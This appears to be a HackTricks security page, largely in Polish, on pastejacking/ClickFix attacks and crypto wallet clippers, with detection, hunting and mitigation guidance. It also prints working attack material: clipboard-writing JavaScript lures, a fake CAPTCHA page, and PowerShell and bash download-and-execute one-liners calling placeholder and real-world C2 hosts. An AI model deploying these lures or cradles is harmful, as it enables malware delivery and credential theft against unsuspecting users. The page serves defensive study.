# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – stara, ale nadal trafna rada

## Overview

Clipboard hijacking – znane też jako *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia bez ich sprawdzania. Złośliwa strona WWW (lub dowolny kontekst obsługujący JavaScript, taki jak aplikacja Electron albo Desktop) programowo umieszcza tekst kontrolowany przez atakującego w system clipboard. Ofiary są zachęcane, zwykle przez starannie przygotowane instrukcje social-engineering, aby nacisnąć **Win + R** (okno Run), **Win + X** (Quick Access / PowerShell) albo otworzyć terminal i *wkleić* zawartość clipboard, co natychmiast wykonuje arbitralne polecenia.

Ponieważ **nie jest pobierany żaden plik i nie jest otwierany żaden załącznik**, technika omija większość zabezpieczeń e-mail i content WWW, które monitorują załączniki, makra lub bezpośrednie wykonanie poleceń. Atak jest więc popularny w kampaniach phishingowych dostarczających commodity malware rodzin takich jak NetSupport RAT, Latrodectus loader czy Lumma Stealer.

## Wallet-address replacement clippers

Inny wariant **clipboard hijacking** nie wkleja w ogóle poleceń: czeka, aż ofiara skopiuje **adres wallet kryptowaluty**, a następnie po cichu podmienia go na adres kontrolowany przez atakującego tuż przed wklejeniem. Jest to szczególnie skuteczne przeciwko długim formatom wallet, ponieważ użytkownicy często sprawdzają tylko pierwsze i ostatnie znaki.

Typowe cechy z prawdziwego świata:
- **Thin loader + nested payload**: widoczna aplikacja/exe wygląda jak legalne narzędzie trading lub "profit", podczas gdy właściwy clipper jest ukryty głębiej w bundle (na przykład loader .NET uruchamiający nested payload Rust).
- **Regex-driven replacement**: malware dopasowuje ciągi takie jak `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, albo nawet ogólne ciągi **44-znakowe podobne do Solana** i przepisuje je na wallet atakującego.
- **Wallet rotation at scale**: nowoczesne próbki Windows mogą osadzać **tysiące** wallet replacement dla każdej waluty zamiast jednego statycznego adresu, zmniejszając zużycie reputacji wallet po każdej kradzieży.

### Windows clipper flow

Częstą implementacją jest ukryte okno zarejestrowane przez **`AddClipboardFormatListener`**. Przy każdej aktualizacji clipboard malware zwykle wywołuje:
- **`OpenClipboard`** → dostęp do bieżących danych clipboard.
- **`GetClipboardData`** → odczyt tekstu.
- **`EmptyClipboard`** + **`SetClipboardData`** → podmiana ciągu wallet na wartość atakującego.

Minimalne regexy hunting często spotykane w clipperach:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Wystarczająca jest persystencja na poziomie użytkownika, aby uzyskać wpływ. Jednym zaobserwowanym wzorcem jest:
- Skopiowanie payload do **`%APPDATA%\silke\silke.exe`**
- Utworzenie **Startup-folder LNK** w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Pomysły na detekcję:
- Procesy, które stale wywołują clipboard APIs, a jednocześnie zapisują dane w `%APPDATA%` oraz folderze użytkownika **Startup**.
- Nowe tworzenie LNK/executable, po którym następują przepisywania clipboard adresów wallet.
- Archiwa lub pakiety fake-software zawierające wiele nieużywanych plików oraz mały launcher uruchamiający zagnieżdżony binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Na macOS niektóre kampanie dostarczają pomocniczy **`unlocker.command`** i instruują ofiarę, aby kliknęła prawym przyciskiem → **Open**, jeśli Gatekeeper mówi, że app jest uszkodzona albo pochodzi od niezidentyfikowanego developera. Skrypt po prostu usuwa quarantine i uruchamia znajdujący się obok `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
To **nie** jest exploit Gatekeeper; to **social-engineered quarantine bypass** wykorzystujący fakt, że decyzje Gatekeeper zależą od atrybutu `com.apple.quarantine` xattr.

Po wykonaniu clipper może utrwalić się jako bieżący użytkownik, zapisując:
- **`~/launch.sh`** – skrypt wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent z `RunAtLoad` i `KeepAlive`

Przydatny szczegół obronny: niektóre próbki implementują **self-healing watchdog**, który ponownie zapisuje LaunchAgent i wrapper mniej więcej co 30 sekund. Jeśli usuniesz plist najpierw **bez zabijania działającego procesu**, malware może natychmiast go odtworzyć. Bezpieczna kolejność czyszczenia:
1. Zatrzymaj aktywny proces clipper.
2. Wyładuj/usuń plist LaunchAgent.
3. Usuń `~/launch.sh` i skopiowany payload.

### Delivery note: fake reputation as a force multiplier

W tej rodzinie malware samo w sobie może pozostać technicznie proste, podczas gdy **warstwa dystrybucji** wykonuje ciężką pracę: fałszywe gwiazdki/forki GitHub, recenzje/pobrania SourceForge, komentarze/wyświetlenia pod tutorialami na YouTube oraz wyglądające na benign komentarze/głosy VirusTotal są używane, aby przed uruchomieniem uczynić binarkę wiarygodną.

## Forced copy buttons and hidden payloads (macOS one-liners)

Niektóre infostealery na macOS klonują strony instalatorów (np. Homebrew) i **wymuszają użycie przycisku “Copy”**, aby użytkownicy nie mogli zaznaczyć tylko widocznego tekstu. Wpis schowka zawiera oczekiwaną komendę instalacyjną plus dołączony payload Base64 (np. `...; echo <b64> | base64 -d | sh`), więc jedno wklejenie uruchamia oba elementy, podczas gdy UI ukrywa dodatkowy etap.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starsze kampanie używały `document.execCommand('copy')`, nowsze polegają na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Użytkownik odwiedza typosquatted lub przejętą stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty JavaScript **ClearFake** wywołuje helper `unsecuredCopyToClipboard()`, który po cichu zapisuje w schowku jednowierszowy PowerShell zakodowany w Base64.
3. Instrukcje HTML mówią ofierze: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` wykonuje się, pobierając archiwum zawierające legalny plik wykonywalny oraz złośliwy DLL (klasyczne DLL sideloading).
5. Loader odszyfrowuje kolejne etapy, wstrzykuje shellcode i instaluje persistence (np. scheduled task) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwy DLL dynamicznie rozwiązuje API za pomocą **GetProcAddress**, pobiera dwa binaria (`data_3.bin`, `data_4.bin`) przez **curl.exe**, odszyfrowuje je używając rolling XOR key `"https://google.com/"`, wstrzykuje końcowy shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Pobiera `la.txt` za pomocą **curl.exe**
2. Uruchamia downloader JScript wewnątrz **cscript.exe**
3. Pobiera ładunek MSI → umieszcza `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Wywołanie **mshta** uruchamia ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, استخراجa `Boat.pst` (CAB), rekonstruuje `AutoIt3.exe` przez `extrac32` i łączenie plików, a następnie uruchamia skrypt `.a3x`, który exfiltruje dane uwierzytelniające przeglądarki do `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Niektóre kampanie ClickFix całkowicie pomijają pobieranie plików i instruują ofiary, aby wkleiły jedną komendę, która pobiera i wykonuje JavaScript przez WSH, utrwala się w systemie i codziennie rotuje C2. Zaobserwowany przykład łańcucha:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Kluczowe cechy
- Obfuskowany URL odwracany w czasie działania, aby utrudnić pobieżną inspekcję.
- JavaScript utrzymuje się przez Startup LNK (WScript/CScript) i wybiera C2 według bieżącego dnia — umożliwiając szybką rotację domen.

Minimalny fragment JS używany do rotacji C2 według daty:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Następny etap zwykle wdraża loader, który ustanawia persistence i pobiera RAT (np. PureHVNC), często pinując TLS do hardcoded certificate i dzieląc traffic na chunki.

Pomysły na detection specyficzne dla tej odmiany
- Drzewo procesów: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (lub `cscript.exe`).
- Artefakty startup: LNK w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wywołujący WScript/CScript z JS path w `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i telemetry command-line zawierające `.split('').reverse().join('')` lub `eval(a.responseText)`.
- Powtarzane `powershell -NoProfile -NonInteractive -Command -` z dużym stdin payloads do podawania długich skryptów bez długich command line.
- Scheduled Tasks, które następnie uruchamiają LOLBins, takie jak `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` pod task/path wyglądającym jak updater (np. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Codziennie rotujące hostnames i URLs C2 z patternem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Koreluj zdarzenia zapisu do clipboardu, po których następuje paste przez Win+R, a potem natychmiastowe wykonanie `powershell.exe`.


Blue-teams mogą łączyć telemetry clipboard, process-creation i registry, aby namierzyć abuse pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię komend **Win + R** – szukaj nietypowych wpisów Base64 / obfuscated.
* Security Event ID **4688** (Process Creation), gdzie `ParentImage` == `explorer.exe`, a `NewProcessName` w { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** dla tworzenia plików pod `%LocalAppData%\Microsoft\Windows\WinX\` lub w folderach tymczasowych tuż przed podejrzanym eventem 4688.
* EDR clipboard sensors (jeśli są dostępne) – koreluj `Clipboard Write`, po którym natychmiast pojawia się nowy proces PowerShell.

## Strony weryfikacyjne w stylu IUAM (ClickFix Generator): clipboard copy-to-console + payloads aware of OS

Niedawne kampanie masowo tworzą fałszywe strony weryfikacyjne CDN/browser ("Just a moment…", styl IUAM), które zmuszają użytkowników do kopiowania OS-specific commands ze swojego clipboardu do natywnych konsoli. To przenosi execution poza browser sandbox i działa zarówno na Windows, jak i na macOS.

Kluczowe cechy stron generowanych przez builder
- Wykrywanie OS przez `navigator.userAgent` w celu dopasowania payloads (Windows PowerShell/CMD vs. macOS Terminal). Opcjonalne decoys/no-ops dla nieobsługiwanych OS, aby utrzymać iluzję.
- Automatyczny clipboard-copy przy niewinnych akcjach UI (checkbox/Copy), podczas gdy widoczny tekst może różnić się od zawartości clipboardu.
- Blokowanie mobile i popover z instrukcjami krok po kroku: Windows → Win+R→paste→Enter; macOS → otwórz Terminal→paste→Enter.
- Opcjonalne obfuscation i single-file injector do nadpisania DOM skompromitowanej strony UI w stylu Tailwind verification (bez potrzeby rejestracji nowej domeny).

Przykład: mismatch clipboard + branching aware of OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence początkowego uruchomienia
- Użyj `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, aby wykonanie było kontynuowane po zamknięciu terminala, zmniejszając widoczne artefakty.

Przejęcie strony in-place na przejętych witrynach
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Pomysły na wykrywanie i hunting specyficzne dla przynęt w stylu IUAM
- Web: Strony, które wiążą Clipboard API z widgetami weryfikacyjnymi; rozbieżność między wyświetlanym tekstem a payloadem schowka; rozgałęzianie `navigator.userAgent`; Tailwind + pojedyncza podmiana strony w podejrzanych kontekstach.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` krótko po interakcji z przeglądarką; instalatory batch/MSI uruchamiane z `%TEMP%`.
- macOS endpoint: Terminal/iTerm uruchamiające `bash`/`curl`/`base64 -d` z `nohup` w pobliżu zdarzeń z przeglądarką; zadania w tle przetrwające zamknięcie terminala.
- Koreluj historię `RunMRU` Win+R i zapisy do schowka z późniejszym utworzeniem procesu konsoli.

Zobacz też techniki wspierające

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix ewolucje (ClearFake, Scarlet Goldfinch)

- ClearFake nadal kompromituje strony WordPress i wstrzykuje loader JavaScript, który łączy zewnętrzne hosty (Cloudflare Workers, GitHub/jsDelivr) oraz nawet blockchainowe wywołania “etherhiding” (np. POST-y do endpointów API Binance Smart Chain, takich jak `bsc-testnet.drpc[.]org`), aby pobierać aktualną logikę przynęty. Najnowsze nakładki mocno wykorzystują fake CAPTCHAs, które instruują użytkowników, aby skopiowali i wkleili jedną komendę (T1204.004) zamiast czegoś pobierać.
- Początkowe wykonanie jest coraz częściej delegowane do podpisanych hostów skryptów/LOLBAS. Łańcuchy ze stycznia 2026 zastąpiły wcześniejsze użycie `mshta` wbudowanym `SyncAppvPublishingServer.vbs` uruchamianym przez `WScript.exe`, przekazując argumenty w stylu PowerShell z aliasami/wildcardami, aby pobrać zdalną zawartość:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` jest podpisany i normalnie używany przez App-V; w połączeniu z `WScript.exe` i nietypowymi argumentami (`gal`/`gcm` aliasy, wildcardowane cmdlety, adresy URL jsDelivr) staje się wysokosygnałowym etapem LOLBAS dla ClearFake.
- W lutym 2026 fałszywe payloady CAPTCHA wróciły do czystych PowerShell download cradles. Dwa działające przykłady:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Pierwszy łańcuch to grabber in-memory `iex(irm ...)`; drugi przechodzi przez `WinHttp.WinHttpRequest.5.1`, zapisuje tymczasowy `.ps1`, a następnie uruchamia go z `-ep bypass` w ukrytym oknie.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` lub PowerShell cradles bezpośrednio po zapisach do schowka/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domeny jsDelivr/GitHub/Cloudflare Worker albo wzorce `iex(irm ...)` z raw IP.
- Network: połączenia wychodzące do hostów CDN worker lub endpointów blockchain RPC z hostów script/PowerShell zaraz po przeglądaniu stron.
- File/registry: tymczasowe tworzenie `.ps1` w `%TEMP%` oraz wpisy RunMRU zawierające te one-linery; blokuj/alertuj na signed-script LOLBAS (WScript/cscript/mshta) uruchamiane z zewnętrznymi URL lub zaciemnionymi stringami aliasów.

## Mitigations

1. Browser hardening – wyłącz zapis do schowka (`dom.events.asyncClipboard.clipboardItem` itp.) albo wymagaj gestu użytkownika.
2. Security awareness – ucz użytkowników, aby *wpisywali* wrażliwe komendy ręcznie albo wklejali je najpierw do edytora tekstu.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, aby blokować arbitralne one-linery.
4. Network controls – blokuj połączenia wychodzące do znanych domen pastejacking i malware C2.

## Related Tricks

* **Discord Invite Hijacking** często nadużywa tego samego podejścia ClickFix po zwabieniu użytkowników do złośliwego serwera:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
